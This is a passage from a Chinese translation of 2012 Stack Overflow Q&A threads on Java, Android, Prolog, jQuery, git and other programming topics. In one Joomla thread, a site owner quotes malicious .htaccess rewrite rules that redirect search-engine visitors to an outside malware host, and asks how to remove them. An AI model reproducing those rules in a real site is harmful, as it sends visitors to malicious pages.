Set<File> filteredList = new LinkedHashSet<File>();

FileNameExtensionFilter filter = new FileNameExtensionFilter("Extensions accepted", "a", "b", "c");

for (File file : allFiles) {
    if (filter.accept(file)) {
        filteredList.add(file);
    }
} 
```

如果有人问，`allFiles`Set 会在其他地方预先填充，不一定使用 File.listFiles() 方法收集。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T07:44:39.830

如果实际上你的意思是在 java 中可以写成 5 行，是的。当您想要过滤列表时，没有更简洁的选择（与具有功能结构的语言（如 Scala 及其过滤器方法）相反）。

我个人看不出你怎么能做得更好，如果你的用例真的要过滤掉扩展名不好的文件，我会在 Java 中做同样的事情。

如果您担心使用`javax.swing`不应该使用的接口和类，那么这两个类都只依赖于`java.io`or `java.util.Locale`（用于根据英语语言环境将文件名设置为小写），因此它们与`FilenameFilter`from一样干净`java.io`。如果您的交易真的是根据不区分大小写的扩展名进行过滤，那么您绝对应该这样做，我的 Eclipse 看到的唯一选择是`com.google.gwt.thirdparty.guava.common.io.PatternFilenameFilter`implementation `java.io.FilenameFilter`，但是您有一个新的依赖项，并且您编写了一个 Regex 模式，它的可读性和可维护性远低于您的扩展名。`FileNameExtensionFilter`所以如果这真的是你的用例，我会留下来 。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T07:44:29.427

我不明白这怎么会不切实际。它不应该比迭代并添加到 Lists 而不是 Set 慢得多（尽管这仍然会稍微快一些并且使用更少的内存）。但是，如果您有充分的理由使用 Set（例如，您想要独特的元素和/或想要快速查询成员资格），我认为您会没事的。

尽管如果不查看其余代码就很难说。我建议你自己测试一下。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T07:50:34.783

像其他人建议的那样，您有适当的方法来过滤集合。我唯一想做的就是使用`CollectionUtils.html#filter`apache commons 来使我的代码更具可读性和易于维护。**

# opengl-es - Cocos2D 视网膜显示

> ID：12192058
> 
> 赞同：1
> 
> 时间：2012-08-30T07:38:08.413
> 
> 标签：opengl-es, cocos2d-iphone

我正在按照本教程在 Cocos2D 中使用 OpenGLES 着色器。

[http://www.raywenderlich.com/10862/how-to-create-cool-effects-with-custom-shaders-in-opengl-es-2-0-and-cocos2d-2-x](http://www.raywenderlich.com/10862/how-to-create-cool-effects-with-custom-shaders-in-opengl-es-2-0-and-cocos2d-2-x)

当我在视网膜模拟器或 iPhone4 上运行我的代码时，这三个效果只占屏幕的 1/4。但是当我运行教程示例代码（从教程下载）时，它会以全屏方式正确显示。我的 Cocos2D 是 2.02。我确定我的代码与示例代码相同。不知道是不是因为我使用了比教程示例代码中的lib更新版本的Cocos2D lib？如何修复它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:08:42.067

我发现...在 AppDelegate.m 评论 if(! [director_ enableRetinaDisplay:YES])

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:30:34.200

该示例当然是在没有视网膜资产（-hd 扩展名）的情况下提供的。因此，如果您激活 Retina Display ([director_ enableRetinaDisplay:YES])，SD 资源将被视为 HD 资源，并显示为一半大小。

# android - 拖放和移动 ImageView

> ID：12192059
> 
> 赞同：0
> 
> 时间：2012-08-30T07:38:08.910
> 
> 标签：android, view

我有代码可以拖放和移动下面的图像

在那我通过按下按钮动态添加图像。

但是当我添加一张图片时，我失去了前一张图片的联系。这意味着我无法通过添加图像来移动上一张图像。我只能控制新创建的图像

```
public class DragAndDropBasicActivity extends Activity implements OnTouchListener {
private ImageView letterView;                       // The letter that the user drags.
private ImageView emptyLetterView;              // The letter outline that the user is supposed to drag letterView to.
private AbsoluteLayout mainLayout;
private Button butClick;
int i = 0;
/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    mainLayout = (AbsoluteLayout) findViewById(R.id.mainLayout);
    mainLayout.setOnTouchListener(this);

    emptyLetterView = (ImageView) findViewById(R.id.emptyLetterView);
    butClick = (Button)findViewById(R.id.button1);
    butClick.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            letterView =  new ImageView(DragAndDropBasicActivity.this);
            letterView.setId(i++);
            letterView.setImageResource(R.drawable.hk_a1);
            letterView.setOnTouchListener(DragAndDropBasicActivity.this);
            mainLayout.addView(letterView);
        }
    });

}

private boolean dragging = false;
private Rect hitRect = new Rect();

@Override
/**
 * NOTE:  Had significant problems when I tried to react to ACTION_MOVE on letterView.   Kept getting alternating (X,Y) 
 * locations of the motion events, which caused the letter to flicker and move back and forth.  The only solution I could 
 * find was to determine when the user had touched down on the letter, then process moves in the ACTION_MOVE 
 * associated with the mainLayout.
 */
public boolean onTouch(View v, MotionEvent event) {
    boolean eventConsumed = true;
    int x = (int)event.getX();
    int y = (int)event.getY();

    int action = event.getAction();
    if (action == MotionEvent.ACTION_DOWN) {
        if (v == letterView) {
            dragging = true;
            eventConsumed = false;
        }
    } else if (action == MotionEvent.ACTION_UP) {

        if (dragging) {
            emptyLetterView.getHitRect(hitRect);
            if (hitRect.contains(x, y))
                setSameAbsoluteLocation(letterView, emptyLetterView);
        }
        dragging = false;
        eventConsumed = false;

    } else if (action == MotionEvent.ACTION_MOVE) {
        if (v != letterView) {
            if (dragging) {
                setAbsoluteLocationCentered(letterView, x, y);
            }
        }
    }

    return eventConsumed;

}

private void setSameAbsoluteLocation(View v1, View v2) {
    AbsoluteLayout.LayoutParams alp2 = (AbsoluteLayout.LayoutParams) v2.getLayoutParams();
    setAbsoluteLocation(v1, alp2.x, alp2.y);
}

private void setAbsoluteLocationCentered(View v, int x, int y) {
    setAbsoluteLocation(v, x - v.getWidth() / 2, y - v.getHeight() / 2);
}

private void setAbsoluteLocation(View v, int x, int y) {
    AbsoluteLayout.LayoutParams alp = (AbsoluteLayout.LayoutParams) v.getLayoutParams();
    alp.x = x;
    alp.y = y;
    v.setLayoutParams(alp);
} 
```

}

谁能帮我控制以前添加的图像，以便我可以移动以前添加的图像。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T09:07:12.240

最后我得到了答案，我必须制作一个 imageview 数组，然后比较每个 imageview

```
ArrayList<ImageView> mArrayList = new ArrayList<ImageView>(); 
```

接着

```
 public void onClick(View v) {
            // TODO Auto-generated method stub
            letterView =  new ImageView(DragAndDropBasicActivity.this);
            mArrayList.add(letterView);
            letterView.setId(i++);
            letterView.setImageResource(R.drawable.hk_a1);
            letterView.setOnTouchListener(DragAndDropBasicActivity.this);
            mainLayout.addView(letterView);
        } 
```

现在我必须检查

```
 public boolean onTouch(View v, MotionEvent event) {
    boolean eventConsumed = true;
    int x = (int)event.getX();
    int y = (int)event.getY();
    for (ImageView img : mArrayList) {
        if(v == img){
            letterView = img;
        }
    } 
```

通过这种方式，我得到了解决方案 Yuppy !!!!!!!!!

# c# - 使用 C# (MVC) 以编程方式更新 web.config applicationSettings

> ID：12192067
> 
> 赞同：1
> 
> 时间：2012-08-30T07:38:29.393
> 
> 标签：c#, asp.net-mvc-3, web-services, web-config

我想在运行时更新 web.config applicationSettings 中的 Web 引用 Url

这是网络配置应用程序设置

```
<applicationSettings>
<ItineraryBuilder.Properties.Settings>
  <setting name="ItineraryBuilder_SchedulesConnectionsService_SchedulesConnectionsService"
    serializeAs="String">
    <value>http://www.pathfinder-xml.com/soap/*/services/SchedulesConnections</value>
  </setting>
  <setting name="ItineraryBuilder_SalesForceService_SforceService"
    serializeAs="String">
    <value>https://login.salesforce.com/services/Soap/c/25.0/0DFd00000000Wa6</value>
  </setting>
  <setting name="ItineraryBuilder_OAGService_CBWSPublicService"
    serializeAs="String">
    <value>http://ondemand.oag.com:80/CBWebServicePublic/CBWSPubliclPort</value>
  </setting>
</ItineraryBuilder.Properties.Settings>
</applicationSettings> 
```

这是我用来更新的代码

```
var configuration = System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration("~");
var section = (System.Configuration.ClientSettingsSection)configuration.GetSection("applicationSettings/ItineraryBuilder.Properties.Settings");

System.Configuration.SettingValueElement sv = new System.Configuration.SettingValueElement();
sv.Equals("https://test.salesforce.com/services/Soap/c/25.0/0DFd00000000Wa6");
section.Settings.Get("ItineraryBuilder_SalesForceService_SforceService").Value = sv;
configuration.Save(); 
```

但它不会更新值，而是从设置中删除值标签

早些时候我试图更新 Web 服务 url，但没有工作，所以我遵循这种方法，请你指导我如何更新 Web 服务 url？

这就是我正在做的

```
SforceService sf = new SforceService();
sf.Url = "test.salesforce.com/services/Soap/c/25.0/0DFd00000000Wa6";; 
```

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:13:28.787

不要这样做。

具体来说，希望您的 Web 应用程序根文件夹不能被应用程序池标识写入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T04:29:32.380

感谢 Amiram Korach 为您提供的所有帮助

在他的帮助下，我明白了我做错了什么。

正如他所建议的，没有必要更新 Web 配置，因为这不是一个好方法，因此上述问题的解决方案是在运行时更新 Web 引用，因此以下代码可以正常工作

```
SforceService sf = new SforceService();
sf.Url = "test.salesforce.com/services/Soap/c/25.0/0DFd00000000Wa6" 
```

我做错了什么，“sf”没有传递给用于创建连接的 API 类。Amiram Korach 帮助我找到了这个问题。

再次感谢。

# prolog - 太多的回溯：为什么这里有“重做”？

> ID：12192069
> 
> 赞同：2
> 
> 时间：2012-08-30T07:38:34.463
> 
> 标签：prolog, backtracking, successor-arithmetics

我在 Prolog 中做一个非常简单的练习，跟踪中有一些我不明白的东西。`>`该程序是对表示为后继的整数的“大于”( )：

```
greater_than(succ(_), 0).
greater_than(succ(A), succ(B)) :-
  greater_than(A, B). 
```

我的问题：我不明白为什么请求会在以下跟踪中`greater_than(succ(succ(succ(0))),succ(0))`生成：`redo`

```
[trace] ?- greater_than(succ(succ(succ(0))),succ(0)).
Call: (6) greater_than(succ(succ(succ(0))), succ(0)) ? creep
Call: (7) greater_than(succ(succ(0)), 0) ? creep
Exit: (7) greater_than(succ(succ(0)), 0) ? creep
Exit: (6) greater_than(succ(succ(succ(0))), succ(0)) ? creep
true ;
Redo: (7) greater_than(succ(succ(0)), 0) ? creep
Fail: (7) greater_than(succ(succ(0)), 0) ? creep
Fail: (6) greater_than(succ(succ(succ(0))), succ(0)) ? creep
false. 
```

**为什么`redo`这里有？我怎样才能避免它（当然没有削减）？**

顺便说一句，在你问之前：不，这不是某种家庭作业......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T09:30:00.173

好的，所以这是一个给定的编译器/版本组合可能有也可能没有的编译器优化。

更高版本的 SWI 没有这个问题。它可能与*子句索引*有关。这种行为会出现在没有索引的实现上，或者只有第一个参数上的索引。

但显然，[“SWI-Prolog 提供了对多个参数的“即时”索引”](http://www.swi-prolog.org/pldoc/doc_for?object=section%282,%272.17%27,swi%28%27/doc/Manual/jitindex.html%27%29%29)。SWI 5.6.56 手册[指出](http://www.complang.tuwien.ac.at/SWI-Prolog/Manual/dynamic.html)“最多可以索引 4 个参数”。所以它可能索引不止一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:53:52.787

有一个重做的原因是，如果按照下一个子句，prolog 不能推断（不检查它），那么会有一个替代解决方案。诚然，在这种情况下，它只是一个头部统一检查（并不是说这总是微不足道的），但它可能需要很长时间（甚至永远不会终止）。

现在，这正是您应该使用 cut 的地方：您知道额外的选择点不会产生解决方案（因此您不会更改语义 - 绿色剪切）。或者（但它主要是覆盖剪切的语法糖）您可以使用 if-then-else：

```
greater_than(succ(A), B):-
    B = succ(BI) ->
    greater_than(A,BI)
    ; B = 0. 
```

并不是说这仍然会进行额外的计算，而 cut 可以避免这些计算。

PS：我怀疑有人会认为这是作业XD

# android - 在数据文件夹Android中看到多个数据库

> ID：12192071
> 
> 赞同：0
> 
> 时间：2012-08-30T07:38:37.927
> 
> 标签：android, database, eclipse

在我的应用程序运行期间从 Eclipse 浏览文件时，我发现了一件奇怪的事情。到目前为止，在模拟器上运行我的应用程序时，我在文件资源管理器中只看到一个数据库文件夹。现在它显示如下：![多个数据库文件夹](../Images/fd9c8591d475770e5acd3d283a029b2b.png)

这是**Emulator 或 Eclipse**的问题， 我无法弄清楚还是真的生成了这么多数据库？

目前我正在使用**Ubuntu 12.04 和 Eclipse Juno**。

我只是在第一个活动中创建数据库对象：

```
Database db = new Database(Home.this); 
```

数据库包含：

```
 public Database(Context ctx) {
    context = ctx;
     if(DBHelper == null)
        {
         DBHelper = new DatabaseHelper(context);
        }

} 
```

# joomla - Joomla：寻求有关纠正 .htaccess 文件恶意软件问题的建议

> ID：12192076
> 
> 赞同：0
> 
> 时间：2012-08-30T07:38:50.870
> 
> 标签：joomla

在这里寻求一些建议。

我运行一个基于（旧版本）Joomla 的网站和论坛。4 年来一切都很好，直到周末，用户开始收到来自防病毒软件的警告，表明该网站上存在恶意软件。

已运行 Google 网站管理员工具，它指出 .htaccess 文件中存在恶意软件。

果然，我可以看到 .htaccess 文件确实在恶意软件报告开始的那天早上更新了。我在这里阅读了其他一些 q，这表明这并不少见........而且我还阅读了一些建议，您可能需要也可能不需要 .ht 访问文件。

我发现的是这样的：

RewriteEngine On
RewriteCond %{HTTP_REFERER} ^。*(google|ask|yahoo|baidu|youtube|wikipedia|qq|excite|altavista|msn|netscape|aol|hotbot|goto|infoseek|mamma|alltheweb|lycos|search|metacrawler|bing|dogpile|facebook|twitter|blog |live|myspace|linkedin|flickr|nigma|liveinternet|vkontakte|webalta|filesearch|yell|openstat|metabot|nol9|zoneru|km|gigablast|entireweb|amfibi|dmoz|yippy|search|walhello|webcrawler|jayde|findwhat |teoma|euroseek|wisenut|about|thunderstone|ixquick|terra|lookle|metaeureka|searchspot|slider|topseven|allthesites|libero|clickey|galaxy|brainysearch|pocketflier|verygoodsearch|bellnet|freenet|fireball|flemiro|suchbot|acoon |网络内容|devaro|fastbot|netzindex|abacho|allesklar|suchnase|schnellsuche|sharelook|sucharchiv|suchbiene|suchmaschine|web-archiv|infospace).(.* )
RewriteRule ^(.*)$ [http://laspector.pro/cyrculate?8](http://laspector.pro/cyrculate?8) [R=301,L]
RewriteCond %{HTTP_REFERER} ^.*(web|websuche|witch|wolong|oekoportal|t-online|freenet|arcor|alexana|tiscali|kataweb|orange|voila|sfr|startpagina|kpnvandaag|ilse|wanadoo|telfort|hispavista|passagen|spray|eniro|telia |bluewin|sympatico|nlsearch|atsearch|klammeraffe|sharelook|suchknecht|ebay|abizdirectory|alltheuk|bhanvad|daffodil|click4choice|exalead|findelio|gasta|gimpsy|globalsearchdirectory|hotfrog|jobrapido|kingdomseek|mojeek|searchers|simplyhired|splut |竞技场|thisisouryear|ukkey|uwe|朋友重聚|jaan|qp|rtl|search-belgium|apollo7|bricabrac|findloo|kobala|limier|express|bestireland|browseireland|finditireland|iesearch|爱尔兰信息|kompass|startsiden |confex|finnalle|gulesider|keyweb|finnfirma|kvasir|savio|sol|startsiden|allpages|america|botw|chapu|claymont|clickz|clush|ehow|findhow|icq|goo|westaustraliaonline).(.* )
RewriteRule ^(.*)$ [http://laspector.pro/cyrculate?8](http://laspector.pro/cyrculate?8) [R=301,L]
/IfModule>
恶意软件检查提到的具体项目是 Laspector。

所以，我的问题是：

1.  我可以安全地删除 .htaccess 文件的 .content 或它的某个子集吗？
2.  我们甚至需要一个 .htaccess 文件吗？

该网站是开放访问（无需登录），论坛需要注册和登录，如果这是相关的。

感谢任何人都可以提供的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T09:33:11.550

如果您要使用 SEF 网址，则需要 .htaccess 文件。我知道它还有其他应用程序——它只是最常用的——所以是的，它们在这方面对 Joomla 很重要——尽管不是强制性的——如果你不使用其中的任何功能——你不需要它我不要想！

您应该绝对可以删除上面的所有内容。但是，我建议您将其替换为您使用的 Joomla 分支中的 .htaccess 文件！

# jquery - 第二次调用 fadeIn() 什么也没做

> ID：12192079
> 
> 赞同：2
> 
> 时间：2012-08-30T07:39:09.627
> 
> 标签：jquery, fadein, fadeout

我想在两个内容之间切换。特殊之处在于元素必须按顺序淡出和淡入。我的问题是第一个淡出/淡入有效，但是当我再次触发该过程时，什么也没有发生。要重现，依次单击顶部的三个链接，然后返回 Box1。

**编辑：**哦，是的，一个jsfiddle：http: [//jsfiddle.net/UANvC/](http://jsfiddle.net/UANvC/)

代码片段：

```
<!DOCTYPE HTML>
<html>
    <head>
            <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
            <link href="style.css" rel="stylesheet" />
            <script src="jquery-1.7.2.min.js" ></script>
    </head>

    <body>
            <a href="" id="start">start</a>
            <a href="" id="button1">one</a>
            <a href="" id="button2">two</a>

            <div id="boxes">
            <div id="box1" class="invisible"><p>box1</p></div>
            <div id="box2" class="invisible"><p>box2</p></div>
            </div>

            <div id="box11" class="box box1">box11</div>
            <div id="box12" class="box box1">box12</div>
            <div id="box13" class="box box1">box13</div>
            <div id="box14" class="box box1">box14</div>
            <div id="box15" class="box box1">box15</div>

            <div id="box21" class="box box2">box21</div>
            <div id="box22" class="box box2">box22</div>
            <div id="box23" class="box box2">box23</div>
            <div id="box24" class="box box2">box24</div>
            <div id="box25" class="box box2">box25</div>

            <script src="script.js" ></script>

    </body>
</html> 
```

CSS：

```
.invisible {
    display: none;
}
#boxes {
    width: 300px;
    height: 300px;
    border: 1px solid #ccc;
}
#boxes p {
    width: 300px;
    height: 300px;
}
.box {
    float:left;
    width: 50px;
    height: 50px;
    border: 1px solid #ccc;
    display: none;
} 
```

Javascript：

```
function showBox1() {
    $('.box1').each(function(key, value) {
        $(this).delay(50 * (key)).fadeIn(200, function() {
                $('#box1').fadeIn(200);
        });
    });
}
function showBox2() {
    $('.box2').each(function(key, value) {
        $(this).delay(50 * (key)).fadeIn(200, function() {
                $('#box2').fadeIn(200);
        });
    });
}
function hideBox1(callback) {
    $('.box1').each(function(key, value) {
        $(this).delay(50 * (key)).fadeOut(200);
    });
    $('#box1').delay(50*6).fadeOut(200).delay(50*7, function() {
            callback();
    });
}
function hideBox2(callback) {
    $('.box2').each(function(key, value) {
        $(this).delay(50 * (key)).fadeOut(200);
    });
    $('#box2').delay(50*6).fadeOut(200).delay(50*7, function() {
            callback();
    });
}

$('#start').on('click', function() {
    showBox1();
    return false;
});
$('#button1').on('click', function() {
    hideBox1(function() {
            showBox2();
    });
    return false;
});
$('#button2').on('click', function() {
    hideBox2(function() {
        showBox1();
    });
    return false;
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:25:45.880

**编辑**

经过一些测试，我找到了解决它的方法，但我对此没有任何解释。我在 box1 或 box2 的每个动画之前调用 dequeue 函数。

如果您找到解释，我有兴趣阅读它。

**代码版本 2**

```
function showBox1() {
    $('.box1').each(function(key, value) {
        $(this).delay(50 * (key)).fadeIn(200)
    });
    $('#box1').dequeue();
    $('#box1').fadeIn(200);
}
function showBox2() {
    $('.box2').each(function(key, value) {
        $(this).delay(50 * (key)).fadeIn(200)
    });
    $('#box2').dequeue();
    $('#box2').fadeIn(200);
}
function hideBox1(callback) {
    $('.box1').each(function(key, value) {
        $(this).delay(50 * (key)).fadeOut(200);
    });
    $('#box1').dequeue();
    $('#box1').delay(50*6).fadeOut(200).delay(50*7, callback);
}
function hideBox2(callback) {
    $('.box2').each(function(key, value) {
        $(this).delay(50 * (key)).fadeOut(200);
    });
    $('#box2').dequeue();
    $('#box2').delay(50*6).fadeOut(200).delay(50*7, callback);
}

$('#start').click(function() {
    showBox1();
    return false;
});
$('#button1').click(function() {
    hideBox1(showBox2);
    return false;
});
$('#button2').click(function() {
    hideBox2(showBox1);
    return false;
}); 
```

Jsfiddle 示例[在这里](http://jsfiddle.net/charlesjourdan/UANvC/5/)。如果您在一个和两个上单击太快，则会出现问题

# html - 无边距对齐按钮

> ID：12192080
> 
> 赞同：0
> 
> 时间：2012-08-30T07:39:12.000
> 
> 标签：html, css, dom, button, margin

我想垂直对齐两个定义大小的图像按钮，它们之间没有任何空格（边距）

我试图将边距设置为 0，但空间仍然存在

```
<html>  
  <head>
    <title>Test</title>

    <style>
      .test {
        width:0.8em;
        height:0.5em;
        margin:0px;
        border:1px solid black;
        background-repeat:no-repeat;
        background-position:center;
        visibility:visible;
      }
    </style>
  </head>

  <body>
    <form>
      <div style="border:1px solid black; display:inline-block;">
        <input class="test" style="background-image:url(arrow_up.png)" type="button" value="^">
        <br>
        <input class="test" style="background-image:url(arrow_down.png)" type="button" value="v">
      </div>
    </form>
  </body>
</html> 
```

它看起来像这样，但应该像这样

```
 +-+              +-+
    |^|              |^|  
    | |      =>      |v|
    |v|              +-+
    | |
    +-+ 
```

你知道我需要设置哪个属性来消除边距吗？

编辑（答案）：好的，所以感谢大家的组合`display:block;`和删除`<br>`我想要的

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T07:42:39.393

尝试使它们（输入）块元素，默认情况下它们是内联元素并且可能提供一些空格。

演示： http: [//jsfiddle.net/2YNTk/1/，http](http://jsfiddle.net/2YNTk/1/) : [//jsfiddle.net/2YNTk/2/](http://jsfiddle.net/2YNTk/2/)（带`br`标签）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T07:44:34.880

从`<br>`第一个输入标记之后的 html 代码中删除。

删除 br 并将 display:block 添加到测试类。

这里是演示[http://jsfiddle.net/8yyrr/](http://jsfiddle.net/8yyrr/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-30T07:41:48.000

我会说您将按钮放在表格内并更改表格的间距。然后您可以在不使用边距的情况下对齐按钮。

```
<table cellspacing="30">
  <tr>
    <td>
      <input class="test" style="background-image:url(arrow_up.png)" type="button" value="^">
    </td>
  </tr>
  <tr>
    <td>
      <input class="test" style="background-image:url(arrow_down.png)" type="button" value="v">
      </div>
    </td>
  </tr>
</table> 
```

这会给你垂直对齐

# node.js - module.exports 还是 this.func() { }？

> ID：12192082
> 
> 赞同：0
> 
> 时间：2012-08-30T07:39:14.303
> 
> 标签：node.js

在 NodeJS 中，如果我们使用`this`关键字定义函数，它就会暴露出来。

例如：

```
// module.js

this.func1 = function () {
    console.log('func1');
} 
```

然后，如果您`require('module')`可以访问 func1。

我想知道它有什么不同`module.exports`？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:46:33.547

简单测试：创建新文件并执行：

```
console.log( this );
console.log( module.exports );

this.test = 1;

console.log( this );
console.log( module.exports ); 
```

这清楚地表明这`this`是对 的引用`module.exports`，即没有区别。

# graphics - 将颜色分解为其 rgb 值

> ID：12192083
> 
> 赞同：2
> 
> 时间：2012-08-30T07:39:15.930
> 
> 标签：graphics

我正在 xlib 中编写一个项目并且遇到了关于颜色的问题。我使用无符号长类型变量来存储颜色值。有人知道我如何获取每种颜色的红色绿色和蓝色值吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:45:45.333

您是说 24 位颜色（每个颜色分量 8 位）一起存储在一个 32 位整数中吗？如果是这种情况，您可以使用逻辑 AND 操作将其他位归零来获取值。

假设你从

```
/*
alpha? r g b
00000000 10101010 10101010 10101010 your 32 bit integer might look like this
& logical AND operator
00000000 00000000 00000000 11111111 a bit mask
=
00000000 00000000 00000000 10101010 the result
so now your 32 bit integer only has the blue values.
To do this in code...
*/
unsigned char B = (unsigned char) (your_integer & 0x000000ff) //000000ff is hex version of the bit mask
//but now what about the other two colors? you can't just apply a bit mask like 0000ff00 because 00000000000000001010101000000000 is much larger than 255.

//So you have to either divide the result by 256 to shift the bits right, or use >>8 to shift them to the right.

unsigned char G = (unsigned char) ((your_integer & 0x0000ff00) / 256)
unsigned char R = (unsigned char) ((your_integer & 0x00ff0000) / 256^2)
//or using the way I've used in the past... shifting before the mask.

unsigned char G = (unsigned char) ((your_integer >> 8) & 0x000000ff)
unsigned char R = (unsigned char) ((your_integer >> 16) & 0x000000ff) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T07:43:05.997

```
 byte a = (byte)(value >> 24);
        byte r = (byte)(value >> 16);
        byte g = (byte)(value >> 8);
        byte b = (byte)value; 
```

# javascript - 如何在不嵌套的情况下分配回调参数

> ID：12192092
> 
> 赞同：0
> 
> 时间：2012-08-30T07:39:44.323
> 
> 标签：javascript

我喜欢在私有命名空间中编写回调函数，然后通过引用调用它们。例如

```
var myCallback = function() {

};

// ... somewhere else in the class.
SomeOtherObject.doSomething(myCallback); 
```

这使得代码更整洁，更可扩展。但是，当我需要将任何参数从原始函数传递给回调时，它会变得混乱，我必须将回调引用包含在闭包中。例如

```
var myCallback = function(a_var, another_var) {

};

// ... somewhere else in the class.
a_var = "something";
SomeOtherObject.doSomething(function(another_var) {
    myCallback(a_var, another_var);
}; 
```

这导致回调需要两个函数调用而不是一个，从而产生开销。这也意味着我有一个未记录的闭包匿名函数 - 或者我记录了这两个函数。（与其说是缺少的函数定义不如参数定义那么烦人。）如果回调很小——就像好的函数一样——那么把它放在私有范围内似乎不值得。

做这个的最好方式是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:45:34.373

部分应用程序实现允许您以这种方式传递变量。

例如，使用原生[ES5 的`bind`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/bind)：

```
SomeOtherObject.doSomething( myCallback.bind(null, a_var) ); 
```

*`another_var`调用时将传递给该函数*

但是，它并非在所有地方都受支持，因此您可以[从下划线](http://jsapi.info/underscore/default/bind/)中获取并使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:45:36.127

你可以做函数柯里化。

```
Function.prototype.curry = function() {
    if (arguments.length<1) {
        return this;
    }
    var __method = this;
    var slice = [].slice;
    var args = slice.call(arguments);
    return function() {
        return __method.apply(this, args.concat(slice.call(arguments)));
    }
} 
```

然后

```
var a_var = "something";
SomeOtherObject.doSomething(myCallback.curry(a_var)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T07:45:41.510

你在谈论*curry'ing*。实际上，你可以`Function.prototype.bind`像这样使用 ES5 来完成：

```
var myCallback = function(a_var, another_var) {
};

SomeOtherObject.doSomething(myCallback.bind(null, a_var, another_var); 
```

那里发生的事情是`.bind()`接受参数并创建一个*新函数*并返回它，并带有新的范围和变量。然后，可能传递给的任何其他参数都`doSomething`将出现在该绑定列表的末尾。

使用的警告`.bind()`是性能。出于某种原因（到目前为止我还没有想到）它令人讨厌的缓慢。这在您的应用程序中并不重要，因为我们仍在谈论每秒数十万次操作，但与*普通*函数相比，绑定函数调用会减慢大约 60-90%。

# git - 如何丢弃对 git 子模块的更改？

> ID：12192095
> 
> 赞同：15
> 
> 时间：2012-08-30T07:39:50.970
> 
> 标签：git, git-submodules

我更改了 git 子模块的提交指针：

```
% git status
# On branch fix
# Your branch is behind 'origin/fix' by 1 commit, and can be fast-forwarded.
#
# Changes not staged for commit:
#   (use "git add <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#   modified:   app/lib (new commits)
#
no changes added to commit (use "git add" and/or "git commit -a") 
```

然而，当我这样做时`git checkout`，什么都没有改变：

```
% git checkout -- app/lib && git status
# On branch fix
# Your branch is behind 'origin/fix' by 1 commit, and can be fast-forwarded.
#
# Changes not staged for commit:
#   (use "git add <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#   modified:   app/lib (new commits)
#
no changes added to commit (use "git add" and/or "git commit -a") 
```

这是差异：

```
% git diff
diff --git a/app/lib b/app/lib
index d670460..83baae6 160000
--- a/app/web-lib
+++ b/app/web-lib
@@ -1 +1 @@
-Subproject commit d670460b4b4aece5915caf5c68d12f560a9fe3e4
+Subproject commit 83baae61804e65cc73a7201a7252750c76066a30 
```

知道为什么会这样吗？

谢谢！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-30T07:43:14.777

当其中的 SHA 发生变化时，Git 不会自动更新子模块。

您要么需要`git submodule update`将子模块放回预期的 SHA，要么需要将预期的 SHA`git add app/lib`更改为子模块中的当前值。

# c# - ServiceController 状态不能正确反映实际服务状态

> ID：12192097
> 
> 赞同：16
> 
> 时间：2012-08-30T07:39:55.223
> 
> 标签：c#, windows-services

如果我的服务正在启动或停止，我会让这段代码运行一个 powershell 脚本。

```
Timer timer1 = new Timer();

ServiceController sc = new ServiceController("MyService");

protected override void OnStart(string[] args)
    {
        timer1.Elapsed += new ElapsedEventHandler(OnElapsedTime);
        timer1.Interval = 10000;
        timer1.Enabled = true;
    }

    private void OnElapsedTime(object source, ElapsedEventArgs e)
    {
        if ((sc.Status == ServiceControllerStatus.StartPending) || (sc.Status ==  ServiceControllerStatus.Stopped))
        {
            StartPs();
        }
    }

    private void StartPs()
    {
        PSCommand cmd = new PSCommand();
        cmd.AddScript(@"C:\windows\security\dard\StSvc.ps1");
        PowerShell posh = PowerShell.Create();
        posh.Commands = cmd;
        posh.Invoke();
    } 
```

当我从 cmd 提示符终止我的服务时它工作正常但是即使我的服务已启动并正在运行，powershell 脚本也会继续执行自身（它在计算机上附加一个文件）知道为什么吗？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-08-30T08:03:03.520

该`ServiceController.Status`物业*并不总是活*的；它在第一次被请求时被懒惰地评估，但（除非被请求）**只有**那一次；后续查询通常`Status` *不会*检查实际服务。要强制执行此操作，请添加：

```
sc.Refresh(); 
```

检查前`.Status`：

```
private void OnElapsedTime(object source, ElapsedEventArgs e)
{
    sc.Refresh();
    if (sc.Status == ServiceControllerStatus.StartPending ||
        sc.Status == ServiceControllerStatus.Stopped)
    {
        StartPs();
    }
} 
```

没有那个`sc.Refresh()`，如果它`Stopped`最初是（例如），它*总是*会说`Stopped`。

